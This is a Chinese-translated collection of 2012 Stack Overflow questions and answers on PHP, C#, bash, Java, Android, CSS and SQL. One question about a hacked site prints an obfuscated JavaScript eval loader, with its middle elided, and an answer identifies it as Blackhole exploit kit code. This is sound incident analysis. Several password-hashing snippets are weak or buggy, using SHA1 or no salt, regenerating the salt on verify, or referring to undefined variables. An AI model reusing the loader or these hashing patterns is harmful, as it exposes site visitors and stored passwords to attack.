$u=substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2);
if(in_array($u,array('de','es','fr','ja','nl','pt','zh'))){
$l=$u;
}else{
$l='en';
}

if(isset($_COOKIE['language'])){
if(in_array($_COOKIE['language'],array('de','en','es','fr','ja','nl','pt','zh'))){
$l=$_COOKIE['language'];
}
} 
```

我希望人们能理解我试图描述的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:00:56.040

这个怎么样？

```
$u = isset($_COOKIE['language']) ? $_COOKIE['language'] : substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

if (in_array($u, array('de','es','fr','ja','nl','pt','zh'))) {
  $l = $u;
} else {
  $l = 'en';
} 
```

顺便说一句，将包含您允许的语言的数组放在*“配置”*文件（将始终包含的文件）中可能很有用，以便于编辑。

**[编辑]** 决定做这个有点晚，但如果你希望它在一行中：

```
$l = in_array(($u = isset($_COOKIE['language']) ? $_COOKIE['language'] : substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2)), array('de','es','fr','ja','nl','pt','zh')) ? $u : 'en'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:59:25.030

您应该在将任何输出发送到浏览器之前运行语言检查，以便正确加载本地化模板。您可以使用 a`global $variable;`来存储语言，不需要 cookie。

```
global $user_language;
$valid_languages = array('de', 'es', 'fr', 'ja', 'nl', 'pt', 'zh');
if ( in_array( substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2), $valid_languages) )
{
    $user_language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
} else {
    $user_language = 'en';
} 
```

在此之后，您可以`$user_language`在加载和使用本地化时检查用户设置的语言。

# linux - i386-pc-mingw32-objdump pe 反汇编中止

> ID：10862855
> 
> 赞同：0
> 
> 时间：2012-06-02T13:55:44.953
> 
> 标签：linux, disassembly, mingw32, binutils

我正在尝试从 1C 光盘反汇编 Sid Meiers Railroads 1.1 原始二进制文件

```
file RailRoads.exe
>>PE32 executable (GUI) Intel 80386, for MS Windows
sudo crossdev i386-pc-mingw32
i386-pc-mingw32-objdump -D RailRoads.exe > RailRoads.dump
>>Aborted
i386-pc-mingw32-objdump -v
>>GNU objdump (GNU Binutils) 2.22 
```

如何处理这样的问题？您知道其他可以与 pe-i386 一起使用的反汇编程序（在 linux 上工作）吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:39:38.750

可能您最好的选择是下载[IDA Pro](http://www.hex-rays.com/products/ida/support/download_demo.shtml)的评估版。MinGW objdump 并不仅仅意味着反汇编 MinGW 工具生成的二进制文件。

# c# - 如何将哈希密码与普通密码进行比较？

> ID：10862857
> 
> 赞同：1
> 
> 时间：2012-06-02T13:55:54.627
> 
> 标签：c#, asp.net, .net

我在使用来自登录页面的普通密码验证数据库中的哈希密码时遇到了很大的麻烦。如何通过比较这两个密码来验证用户。这是我的注册页面代码：

```
protected void Button1_Click(object sender, EventArgs e)
{

    SHA384CryptoServiceProvider sh = new SHA384CryptoServiceProvider();
    byte[] plainbytes = Encoding.ASCII.GetBytes(TextBox2.Text);
    var sha = sh.ComputeHash(plainbytes);
    byte[] hashbytes = sh.Hash;
    SqlConnection con = new SqlConnection(constr);
    SqlCommand cmd = new SqlCommand("RegisterUser",con);
    cmd.CommandType = CommandType.StoredProcedure;
    SqlParameter param = null;
    param = cmd.Parameters.Add("@username",SqlDbType.VarChar,10);
    param.Value = TextBox1.Text;
    param = cmd.Parameters.Add("@password", SqlDbType.VarChar, 20);
    param.Value = BitConverter.ToString(hashbytes);
    try
    {
        con.Open();
        cmd.ExecuteNonQuery();
        Label4.Text = "Successfully added account!!!";
    }
    catch (Exception ex)
    {
        throw new Exception("Exception adding account"+ex.Message);
    }
    finally
        {
            con.Close();
        }
} 
```

如何将此密码与来自登录页面的密码进行比较...帮帮我...

带有 SALT 的 HASH 代码：-

```
 private static string CreateSalt(int size)

{

    RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

    byte[] buff = new byte[size];

    rng.GetBytes(buff);

    return Convert.ToBase64String(buff);

}

private static string CreatePasswordHash(string pwd, string salt)

{

    string saltAndPwd = String.Concat(pwd, salt);

    string hashedPwd =

    FormsAuthentication.HashPasswordForStoringInConfigFile(saltAndPwd, "SHA1");

    hashedPwd = String.Concat(hashedPwd, salt);

    return hashedPwd;

}

protected void btnregister_Click(object sender, EventArgs e)

{

    int saltSize = 5;

    string salt = CreateSalt(saltSize);

    string passwordHash = CreatePasswordHash(txtPassword.Text, salt);

    try

    {

        StoreAccountDetails(txtUserName.Text, passwordHash);

    }

    catch (Exception ex)

    {

        lblMessage.Text = ex.Message;

    }

}

private void StoreAccountDetails( string userName,string passwordHash )

{

    SqlConnection conn = new SqlConnection(constr);

    SqlCommand cmd = new SqlCommand("INSERT INTO Users VALUES(@userName, @passwordHash)", conn);

    SqlParameter sqlParam = null;

    sqlParam = cmd.Parameters.Add("@userName", SqlDbType.VarChar,20);

    sqlParam.Value = userName;

    sqlParam = cmd.Parameters.Add("@passwordHash ", SqlDbType.VarChar,50);

    sqlParam.Value = passwordHash;

    try

    {

       conn.Open();

       cmd.ExecuteNonQuery();

       lblMessage.Text = "User Added Successfully!!!";

    }

    catch( Exception ex )

    {

    throw new Exception("Exception adding account. " + ex.Message);

    }

    finally

    {

       conn.Close();

    }

}

private bool VerifyPassword(string suppliedUserName,string suppliedPassword )

{

     bool passwordMatch=false;

     SqlConnection conn = new SqlConnection(constr);

     SqlCommand cmd = new SqlCommand( "SELECT PasswordHash FROM Users WHERE UserName = @userName", conn );

     SqlParameter sqlParam = cmd.Parameters.Add("@userName",SqlDbType.VarChar,20);

     sqlParam.Value = suppliedUserName;

     try

     {

        conn.Open();

        SqlDataReader reader = cmd.ExecuteReader();

        reader.Read();

        string dbPasswordHash = reader.GetString(0);

        int saltSize = 5;

        string salt = CreateSalt(saltSize);

        reader.Close();

        string hashedPasswordAndSalt =CreatePasswordHash(suppliedPassword, salt);

        passwordMatch = hashedPasswordAndSalt.Equals(dbPasswordHash);

     }

     catch (Exception ex)

     {

        throw new Exception("Execption verifying password. " +ex.Message);

     }

     finally

     {

        conn.Close();

     }

    return passwordMatch;
 }

protected void btnlogon_Click(object sender, EventArgs e)

{

    bool passwordVerified=false;

    try

    {

        passwordVerified =VerifyPassword(txtUserName.Text, txtPassword.Text);

    }

    catch (Exception ex)

    {

        lblMessage.Text = ex.Message;

        return;

    }

    if (passwordVerified == true)

    {

        lblMessage.Text = "Logon successful: User is authenticated";

    }

    else

    {

        lblMessage.Text = "Invalid username or password";

    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:59:10.973

简单的。您对来自登录页面的密码进行哈希处理，并将哈希码与数据库中的哈希码进行比较。

* * *

由于两次都应处理相同的文本，因此为该部分创建一个函数。将文本转换为字节时使用 UTF-8，ASCII 编码不处理所有字符：

```
public static string HashString(string value) {
  SHA384CryptoServiceProvider sh = new SHA384CryptoServiceProvider();
  byte[] plainbytes = Encoding.UTF8.GetBytes(value);
  byte[] hash = sh.ComputeHash(plainbytes);
  return BitConverter.ToString(hashbytes);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T14:49:23.663

从安全的角度来看，您的代码非常糟糕：

1.  使用盐。通常一个随机值（64 位或更多）与 db 中的哈希一起存储。
2.  使用慢速 KDF，例如 PBKDF2、bcrypt 或 scrypt
    PBKDF2 是最简单的，因为 .net 已经包含一个实现：[Rfc2898DeriveBytes 类](http://msdn.microsoft.com/en-us/library/system.security.cryptography.rfc2898derivebytes.aspx)
3.  不要使用`Encoding.ASCII`，但是`Encoding.UTF8`。其他包含非 ASCII 字符的密码会变得非常弱。

然后要验证输入的密码，从数据库中读取哈希和盐。用您从数据库中读取的盐对候选密码进行哈希处理，并比较哈希值。

* * *

ASP.net 还包含一个名为 的库[`Membership`](http://msdn.microsoft.com/en-us/library/yh26yfzy.aspx)，但我对它不太熟悉。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T14:47:12.437

**更新**

现在您更新了代码，我仍然看到一些问题。您应该使用 Salt，但首先您需要您的代码实际工作。添加盐很容易。

“mypassword”的简单 SHA 哈希会产生一个远大于 20 个字符的字符串。您无法将 base64 的哈希密码放入 20 个字符的字段中。更改列大小和您的代码以支持更大的散列。

**更新 2**

这是哈希上带有 Salt 的代码。您必须更新 RegisterUser 存储过程以存储盐以及用户名和哈希密码。每个用户都需要一个新的 Salt。盐本身不需要散列或加密。

您还需要从 LogInUser 存储过程中返回盐。

阅读以下评论：

```
private byte[] Combine(byte[] a, byte[] b)
{
   byte[] c = new byte[a.Length + b.Length]; 
   System.Buffer.BlockCopy(a, 0, c, 0, a.Length); 
   System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length); 
   return c; 
}

protected void Button1_Click(object sender, EventArgs e)
{    
    byte[] salt = new byte[16];
    RNGCryptoServiceProvider random = new RNGCryptoServiceProvider();
    random.GetNonZeroBytes(salt);

    SHA384CryptoServiceProvider sh = new SHA384CryptoServiceProvider();
    byte[] plainbytes = Encoding.ASCII.GetBytes(TextBox2.Text);

    var saltedBytes = Combine (salt, plainbytes);
    var sha = sh.ComputeHash(saltedBytes);

    SqlConnection con = new SqlConnection(constr);
    SqlCommand cmd = new SqlCommand("RegisterUser",con);
    cmd.CommandType = CommandType.StoredProcedure;

    SqlParameter param = null;
    param = cmd.Parameters.Add("@username",SqlDbType.VarChar,10);
    param.Value = TextBox1.Text;

    param = cmd.Parameters.Add("@password", SqlDbType.VarChar, 128);
    param.Value = Convert.ToBase64String(sha);

    // Store salt to use when comparing.
    param = cmd.Parameters.Add("@salt", SqlDbType.VarChar, 128);
    param.Value = Convert.ToBase64String(salt);

    try
    {
        con.Open();
        cmd.ExecuteNonQuery();
        Label4.Text = "Successfully added account!!!";
    }
    catch (Exception ex)
    {
        throw new Exception("Exception adding account"+ex.Message);
    }
    finally
    {
        con.Close();
    }
}

public bool searchtable() 
{           
    SqlConnection con = new SqlConnection(constr);
    SqlCommand cmd = new SqlCommand("LogInUser",con);
    cmd.CommandType = CommandType.StoredProcedure;

    SqlParameter param = null;
    param = cmd.Parameters.Add("@username",SqlDbType.VarChar,10);
    param.Value = TextBox1.Text;

    try
    {
        con.Open();
        SqlDataReader reader = cmd.ExecuteReader();
        reader.Read();

        // Get the salt hashed password
        string dbpassmatch = reader.GetString(0);

        // Get the salt
        byte[] salt = Convert.FromBase64String(reader.GetString(1));

        // Recreate the salted hashed password
        byte[] plainbyte = Encoding.ASCII.GetBytes(TextBox2.Text);
        SHA384CryptoServiceProvider sh = new SHA384CryptoServiceProvider();
        var saltedBytes = Combine (salt, plainbytes);
        var sha = sh.ComputeHash(saltedBytes);            

        // Now it matches what you did in insert.
        String dbpassword = Convert.ToBase64String(sha);

        reader.Close();

        return dbpassword.Equals(dbpassmatch);
    }
    catch (Exception ex)
    {
        throw new Exception("Exception adding account" + ex.Message);
    }
    finally
    {
        con.Close();
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T14:00:38.357

您可以在数据库端进行散列，而不是应用程序端。这将是最简单的，您将密码作为纯文本发送到注册存储过程，它将对其进行哈希处理（使用 sha1 之类的东西）然后您将在用户执行登录时再次发送密码，存储过程将查找您发送的用户名，然后将散列密码并将其与注册期间保存的密码进行比较。

# bash - 在 bash 中转换 YYYY-MM-DDTHH:MM:SS+/-HH:MM 日期

> ID：10862858
> 
> 赞同：1
> 
> 时间：2012-06-02T13:55:57.010
> 
> 标签：bash, date, sed, awk

> **可能重复：**
> [在 bash 中转换日期格式](https://stackoverflow.com/questions/6508819/convert-date-formats-in-bash)

我需要转换一个日期，例如

```
2012-06-01T19:05:00+02:00 
```

像这样

```
01-06-2012 19:05 
```

理想情况下使用**sed**或**awk**。我该怎么做呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T14:28:21.840

这可以在不借助 sed 或 awk 的情况下完成，因为 bash 本身可以完成大部分所需的字符串替换。具体来说，您只需要：

1.  将**T**替换为空格，并且
2.  删除您的时区信息。

日期格式的其余部分可以由**date**命令处理。

```
$ date_string='2012-06-01T19:05:00+02:00'
$ date_string="${date_string/T/ }"
$ date_string="${date_string/+*/}"
$ date -d "$date_string" '+%d-%m-%Y %H:%M'
01-06-2012 19:05 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T14:17:16.887

```
echo "2012-06-01T19:05:00+02:00"|sed 's/\(.*\)T\([0-9]*:[0-9]*\).*/\1 \2/'
2012-06-01 19:05 
```

解释它的作用：

*   将所有内容匹配到 T 并稍后将其称为 \1
*   匹配任何后续数字，后跟“：”，后跟任何后续数字并将该组称为 \2
*   打印第一场比赛，空格，第二场比赛

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T14:26:15.443

```
date -d "$(echo '2012-06-01T19:05:00+02:00' | sed 's/T/ /; s/+.*//')" '+%d-%m-%Y %H:%M' 
```

# java - 扩展一个泛型类并第二次实现它的接口

> ID：10862859
> 
> 赞同：1
> 
> 时间：2012-06-02T13:56:06.600
> 
> 标签：java, spring, design-patterns, generics, cxf

我想提出一个场景，它会很好：

*   有一个通用接口，
*   有各种通用基类实现它，
*   为通用基类提供子类，
*   以某种方式获得子类的非通用接口。

使困惑？请继续阅读并告诉我您对解决方案的看法。

假设我想要一个服务来提供基于任何类型的键和来自任何地方（数据库、文件等）的任何类型的对象。

作为一个好的开始，让我们创建一个适当的接口：

```
public interface ObjectProvider<K, V> {

    V provide(K key);
} 
```

通过这种方式，我将能够提供任何类型的实现。我想提供来自数据库和文件的对象。

让我们假设无论对象类型如何，都可以使用相同的数据库逻辑来提供基于 K 的 V。所以我可以为数据库访问编写一个通用基类：

```
public class DBObjectProvider<K, V> implements ObjectProvider<K, V> {

    public V provide(K key) {
        V v = null;
        //some common DB logic to get V based on K
        return v;
    }
} 
```

实际上，从文件中获取对象也是与对象类型无关的：

```
public class FileObjectProvider<K, V> implements ObjectProvider<K, V> {

    public V provide(K key) {
        V v = null;
        //some common file reading logic to get V based on K
        return v;
    }
} 
```

好的，现在我有两个通用类，我可以用它们来获得我想要的任何东西。

现在，我想使用其中一种通用实现来基于数据库中的 String 键获取 String 对象。此外，我想将它定义为使用 Spring XML 的 bean。我想没有办法在 Spring XML 中定义通用 bean（对吗？）所以我将创建一个适当的类。我需要做的就是：

```
public class DBStringStringProvider extends DBObjectProvider<String, String>  {
} 
```

现在我可以将这个bean注入任何：

```
private ObjectProvider<String, String> objectProvider; 
```

一切都很好，现在是关键部分。我可以在很多方面使用我有用的 DB String-String 提供程序（hhmmm... 好吧不是真的）。假设我想用它制作一个 Web 服务。假设我想将 DBStringStringProvider 公开为 CXF Web 服务并对其进行测试。问题是此类 Web 服务的客户端代码如下所示：

```
JaxWsProxyFactoryBean factory = new JaxWsProxyFactoryBean();
factory.setServiceClass(<INTERFACE>.class);
<INTERFACE> client = (<INTERFACE>) factory.create(); 
```

所以我需要一个 DBStringStringProvider 的非泛型接口，我没有，因为它扩展了它的泛型基类。

我可以执行以下操作：

用另一个接口扩展 ObjectProvider<String, String> 接口：

```
@WebService
public interface StringStringProvider extends ObjectProvider<String, String> {

    @WebMethod
    String provide(String key);
} 
```

另外在通用基类已经实现的地方实现它：

```
public class DBStringStringProvider extends DBObjectProvider<String, String>
implements StringStringProvider {
} 
```

在实现基类已经引入的相同接口时，我感到有点不舒服。但通过这种方式，我可以使用 WS 客户端：

```
factory.setServiceClass(StringStringProvider.class);
StringStringProvider client = (StringStringProvider) factory.create(); 
```

我的问题是：做我刚刚做的事情是一个好习惯吗？如果没有，还有其他方法吗？

这只是一种情况，如果为已定义为通用的东西提供非通用接口会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T04:00:05.173

我不愿批评所提出问题的抽象程度的动机。为了接口的一致性和减少重复代码，这些场景时有发生。Java，尤其是 icky 服务框架，使这项任务比它需要的复杂得多；这种不必要的复杂性并不意味着原始设计不好。Java 每天都让我咬紧牙关，原因有很多，都是毫无意义的冗长。

我会很高兴地确认，定义一个免费的具体子接口是可以接受的并且是常见的做法。您被迫采取此操作，因为您正在解决服务框架中的限制（不允许参数化接口）。

唯一需要注意的是，您真的在尝试在 Java中执行*typedef 。*我已经能够在 Java 中执行 typedef 的最好结果导致了一个令人震惊的丑陋结构，这将使您原始帖子的评论者，从他们对复杂性的厌恶来看，想要衡量他们自己的眼睛。

我怀疑在实践中你会遇到任何问题，但总的来说，像这个例子这样的[伪类型定义会导致意想不到的痛苦。](http://www.ibm.com/developerworks/java/library/j-jtp02216/index.html)在一般情况下，当您创建一个普通的 interface 子`T`接口`S`时，很容易使用它来`T`代替`S`它适用的任何地方。 `S`可能是一个冗长的参数化 Java 类表达式，例如，阅读或键入会让人头疼，而且`T`可能又好又短。但是对于方法/服务调用/构造函数参数，您仍然需要`S`声明类型，否则您可能会限制方法或类的有用性。一个人为的例子：

```
public interface Info extends Map< String, List< FooBar > > {}

public interface Service {
    public Info doSomething( Info info );
} 
```

没有理由`Service`只接受`Info`，因为没有向;`Info`添加任何 API 。`Map< String, List< FooBar > >`正如所写，doSomething 的调用者不能将任何旧地图作为输入；他们必须以`Info`某种方式创建一个新的并使用该映射的内容对其进行初始化，因为 Java（与几乎所有其他广泛使用的企业语言一样）使用主格类型。

# java - 如果我以 2.1 为目标，如何使用 2.2 功能？

> ID：10862860
> 
> 赞同：0
> 
> 时间：2012-06-02T13:56:07.630
> 
> 标签：java, android, versioning, compatibility

我喜欢在我的应用程序中使用 TrafficStats API。问题是 - 我的目标是 2.1

它确实是我的应用程序的一个插件，它可以在没有此功能的情况下运行。包含此内容并使应用程序与 2.1 兼容的方法是什么？我知道我可以开始维护 2 个 APK，但这是我不想做的事情，似乎很麻烦。还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:00:29.743

> 还有其他方法吗？

第 1 步：将项目的构建目标设置为 Android 2.2（或更高版本，如果您愿意）

第 2 步：将所有对 Android 2.2 特定功能的调用封装在版本保护块中：

```
if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.FROYO) {
  // do something only on 2.2
} 
```

第 3 步：确保您`android:minSdkVersion`的系统尽可能低（例如，Android 2.1 为 7）

第 4 步：运行偶尔的 lint 检查以确认您没有在版本保护块之外意外使用特定于 Android 2.2 的东西

# html - CSS 不显示空 div 标签

> ID：10862863
> 
> 赞同：2
> 
> 时间：2012-06-02T13:56:36.280
> 
> 标签：html, css

我一直有一个空的 div HTML 标签的问题。我已经向它添加了 CSS，但没有显示样式。我已经尝试将   添加到它，但没有做任何事情。有没有其他方法可以解决这个问题？有问题的CSS：

```
<style type="text/css">
div#mainbutton { width: 28px; height: 28px; border-color: rgb(0, 0, 0); border-width:     
5px; border-radius: 2px; }
</style> 
```

的HTML：

```
<div id="mainbutton">&nbsp;</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T14:00:12.683

您只是缺少边框样式，当您不添加`border-style`属性时，浏览器不知道该怎么做。

```
#mainbutton { 
    width: 28px;
    height: 28px; 
    border-color: rgb(0, 0, 0); 
    border-width:5px; 
    border-radius: 2px; 
    border-style: solid;
}​ 
```

作为**边框样式**，您可以使用如下`solid, dotted, dashed, double, groove, ridge, inset, outset or none`：

[在这里](http://www.w3schools.com/cssref/pr_border-style.asp)你可以阅读更多关于它的信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T14:00:32.170

只需添加`border:solid;`

```
 <style type="text/css"> 
    div#mainbutton {width:28px;height:28px;border:solid 5px rgb(0, 0, 0);border-radius: 2px; } 
    </style> 
```

并使用 css 快捷方式，`border:solid 5px rgb(0,0,0)`就像`border-style:solid;border-width:5px;border-color:rgb(0,0,0)`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:58:10.413

您需要在 css 中使用边框样式。

# php - webapp被黑了，但是插入的确切代码是什么？回声（gzinflate（base64_decode（“.....”）

> ID：10862870
> 
> 赞同：2
> 
> 时间：2012-06-02T13:58:07.567
> 
> 标签：php, linux, command-line

我在各种 .php 文件中发现了几次出现`echo(gzinflate(base64_decode(".....")`，我很好奇它到底做了什么。我想我设法使用`base64 -d < fileetje.b64 > fileetje.gz`其中 fileetje.b64 包含字符串数据来解码引号中的文本。但是当我随后尝试对 fileetje.gz 进行压缩时，它会报告错误的数据。此外，当`file fileetje.gz`它说`data`，我希望 GZIP 的数据是类似的。

如何从 Linux 命令行解密数据？

[像http://www.base64online.com/](http://www.base64online.com/)这样的在线解码器也无法理解代码。将字符串数据也添加到问题中是否安全？

*更新*：我即兴创作了一个 php 脚本，因为它只是一个简单的回声（Thnx：glglgl）。这是出来的：

```
<script>d=Date;d=new d();h=-parseInt('012')/5;if(window.document)try{new document.getElementById("qwe").prototype}catch(qqq){st=String;zz='al';zz='v'+zz;ss="";if(1){f='f'+'r'+'o'+'m'+'Ch'+'ar';f=f+'C'+'od'+'e';}e=this[f.substr(11)+zz];t='y';}n="3.5~3.5~51.5~50~15~19~49~54.5~48............... 
```

它结束于：

```
...........9~50~19.5~28.5~5.5~3.5~3.5~61.5".split("a~".substr(1));for(i=0;i!=563;i++){j=i;ss=ss+st[f](-h*(2-1+1*n[j]));}if(1)q=ss;if(zz)e(""+q);</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:15:01.270

嵌入的 javascript 遵循 Black Hole Exploit 工具包的格式。它会注入一个 iFrame 导致您被利用，这可能是个坏消息。认为`echo()`（如上文评论中所述）将是安全的是不正确的。该功能只是将嵌入式恶意软件代码放入您的页面中以造成损害。

**相关 SO 帖子：** [我的 wordpress 网站被黑了，有人告诉我这段代码是做什么的吗？](https://stackoverflow.com/questions/9610996/my-wordpress-site-was-hacked-anyone-tell-what-this-code-does)

**SO 发布关于它是如何工作**的：[这个 JavaScript hack 的目的是什么？](https://stackoverflow.com/questions/9478863/what-is-the-purpose-of-this-javascript-hack)

**相关信息：**

[http://johnbatchelorshow.com/jb/2012/01/lessons-learned-from-the-hacking-black-hole-exploit-kit/](http://johnbatchelorshow.com/jb/2012/01/lessons-learned-from-the-hacking-black-hole-exploit-kit/)

[http://nakedsecurity.sophos.com/2012/03/29/exploring-the-blackhole-exploit-kit/](http://nakedsecurity.sophos.com/2012/03/29/exploring-the-blackhole-exploit-kit/)

# php - 如果它们在 mySQL 中具有相同的值，如何不计算两次？

> ID：10862876
> 
> 赞同：1
> 
> 时间：2012-06-02T13:58:57.243
> 
> 标签：php, mysql

我有一个访客跟踪系统。我跟踪访问者的 ips 和浏览器。我可以计算总访问次数（总行数），但我如何计算唯一访问次数？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-02T14:00:28.207

您可以使用`Distinct`：

```
SELECT Count(DISTINCT visits) from Table; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-02T14:00:40.367

`GROUP BY`在 IP 或 IP+浏览器上 使用！`SELECT COUNT(ip) FROM yourtable GROUP BY ip`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T22:27:57.177

像这样的东西会给你“独特的访问者”，由不同的浏览器/IP点击量来衡量：

```
SELECT COUNT(*) AS unique_visitors FROM (
    SELECT DISTINCT ip, browser FROM visitors
) a 
```

# android - 向各个方向移动位图

> ID：10862878
> 
> 赞同：0
> 
> 时间：2012-06-02T13:59:12.590
> 
> 标签：android, bitmap, touch-event

我所拥有的是，当我单击并拖动我的位图时，它会跟随你的手指，但它实际上只能让我将它向右移动，如果我想的话，我也可以向左倾斜一点但除此之外，几乎不可能让这东西移动。我需要能够在各个方向移动它，你能帮我吗？这是我的代码：

```
@Override
    protected void onDraw(Canvas canvas) 
    {
        super.onDraw(canvas);
        clear.setARGB(0, 0, 0, 0);
        AndroidDudeHitbox.set(AndroidX, AndroidY, AndroidX + AndroidDude.getWidth(), AndroidY + AndroidDude.getHeight());
        canvas.drawRect(AndroidDudeHitbox, clear);
        canvas.drawBitmap(AndroidDude, AndroidX - (AndroidDude.getWidth()/2), AndroidY - (AndroidDude.getHeight()/2), null);
        if (AndroidX > canvas.getWidth() || AndroidX < 0 || AndroidY > canvas.getHeight() || AndroidY < 0) {AndroidX = 30; AndroidY = canvas.getHeight()/2;} 
        invalidate();
    }
@Override
    public boolean onTouch(View v, MotionEvent event) 
    {
        try {
            Thread.sleep(30);
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        if (AndroidDudeHitbox.contains((int)event.getX(), (int) event.getY()))
        {
            switch (event.getAction())
            {
            case MotionEvent.ACTION_MOVE:
                AndroidX = (int) event.getX();
                AndroidY = (int) event.getY();
                break;
            }
        }

        return true;
    } 
```

编辑：我刚刚发现我不能将位图直接向右移动。我可以直接向下和向右移动它。但没有其他的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T15:59:59.730

您检查**AndroidDudeHitbox 是否**包含点（如果它被触摸），但您在其上绘制**AndroidDude**。要么去掉下面的 if 语句，要么在 AndroidDude 上绘制 hitbox。

`if (AndroidDudeHitbox.contains((int)event.getX(), (int) event.getY())){`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-06T23:54:54.473

首先：不要在您的 onTouch 方法中进行“睡眠”调用。这是自找麻烦。

首先，暂时删除检查 AndroidDudeHitbox.contains((int)event.getX(), (int) event.getY()) 的 if 语句。只需始终使用 event.getX() 和 event.getY() 更新 AndroidX 和 AndroidY。

最后，我认为最重要的是，在您更改 onTouch 中的 AndroidX 和/或 AndroidY 值后调用“ **invalidate() ”。**只有调用 'invalidate()' 会导致稍后再次调用 onDraw。

```
public boolean onTouch(View v, MotionEvent event) 
{
    if (true /*AndroidDudeHitbox.contains((int)event.getX(), (int) event.getY())*/)
    {
        switch (event.getAction())
        {
        case MotionEvent.ACTION_MOVE:
            AndroidX = (int) event.getX();
            AndroidY = (int) event.getY();
            invalidate(); // important!!!
            break;
        }
    }

    return true;
} 
```

如果添加对“invalidate()”的调用有效，请再次添加您暂时删除的“if”语句，看看是否一切仍然有效。

# jquery-ui - 在 tinymce 之后尝试呈现 jQuery UI 选项卡时，拆分不是函数

> ID：10862884
> 
> 赞同：0
> 
> 时间：2012-06-02T13:59:44.233
> 
> 标签：jquery-ui, tinymce, jquery-ui-tabs

我正在使用[TinyMCE](http://www.tinymce.com)编辑器（jQuery 包）。在同一页面中，我还使用了 jQuery UI 选项卡。**我的问题是，如果我在页面加载后**尝试呈现我的 jQuery 选项卡，我会收到错误消息**g.split is not a function**并且我的选项卡没有呈现。但是，如果我在页面加载时呈现标签，一切正常。看起来这个问题**只有在 TinyMCE 对象被渲染后**才会出现。

所以，这个问题让我抓狂。任何帮助都会非常受欢迎。

我制作了一个最小的 html 示例页面来重现该问题。如果单击该按钮，您将看到选项卡对象未呈现并且我收到错误消息。另一方面，正确呈现了 jQuery 按钮。所以，这个问题似乎只发生在我的 jQuery 选项卡对象上。

```
<html>
 <head>
  <title>test 1</title>

  <link type="text/css" href="css/custom/jquery-ui.custom.css" rel="stylesheet"/>

  <script type="text/javascript" src="js/jquery-min.js"></script>
  <script type="text/javascript" src="js/jquery-ui-custom-min.js"></script>
  <script type="text/javascript" src="js/tiny_mce/jquery.tinymce.js"></script>

  <script type="text/javascript">

   function render_my_jquery_ui_objects()
   {
    $("#my_button_1" ).button();
    $("#my_tabs").tabs();

    return true;
   }

   $().ready(function() {   
         $('#my_editor_1.tinymce').tinymce({
                 script_url : 'js/tiny_mce/tiny_mce.js',
                 theme : "advanced",
                 theme_advanced_toolbar_location : "top",
                 theme_advanced_toolbar_align : "left",
                 content_css : "css/tinymce.css?" + new Date().getTime()
         });

        //render_my_jquery_ui_objects();  // if I call render_my_jquery_ui_objects() here, it will work fine. Both objects (button and tabs) will be rendered
   });

 </script> 

 </head>
 <body onload=""> <!-- if I put render_my_jquery_ui_objects() in the onLoad event, it will also work fine -->

  <button onclick="render_my_jquery_ui_objects();">Render my jQuery UI objects manually</button> <!-- if I click the button to call render_my_jquery_ui_objects(), only the jQuery button is rendered. The tabs are not rendered. This is my problem here. -->
  <br/><br/>
  <a href="#" id="my_button_1">Button 1 (jQuery)</a>
  <br/><br/>
  <div id="my_tabs">
   <ul>
    <li><a href="#tabs-1">My tab 1</a></li>
    <li><a href="#tabs-2">My tab 2</a></li>
   </ul>
   <div id="tabs-1">
    <p>Tab 1 content</p>
   </div>
   <div id="tabs-2">
    <p>Tab 2 content</p>
   </div>
  </div>
<br/>

<textarea id="my_editor_1" name="my_editor_1" rows="10" cols="100" class="tinymce">
 <b>text in bold</b><br>text normal
</textarea>

 </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-08T13:35:01.120

最后，问题就在我这边。对于那个很抱歉。 [以下是详细信息](http://www.tinymce.com/forum/viewtopic.php?id=28916)。

# java - 使用 Java 将参数传递给 perl 脚本的问题

> ID：10862892
> 
> 赞同：1
> 
> 时间：2012-06-02T14:00:39.037
> 
> 标签：java, perl, snmp

我有一个 perl 脚本，用于将 SNMP 陷阱发送到远程主机

```
 my (@varbinds,$hostname);

   GetOptions(
          "hostname=s"    =>\$hostname,
   );

   $hostnode = `hostname`;     # Unix command to find the hosts name
   chomp $hostnode;
   push (@varbinds, ".0.1",OCTET_STRING, $hostnode);
   for (my $i;$i <= $#ARGV;$i++){
      push (@varbinds, ".0.".($i + 3),OCTET_STRING, $ARGV[$i]);
   }

   my ($session, $error) = Net::SNMP->session(
                    -hostname  => $hostnode,
                    -community => 'public',
                    -port      => 162,
                    -version   => 2,
   );

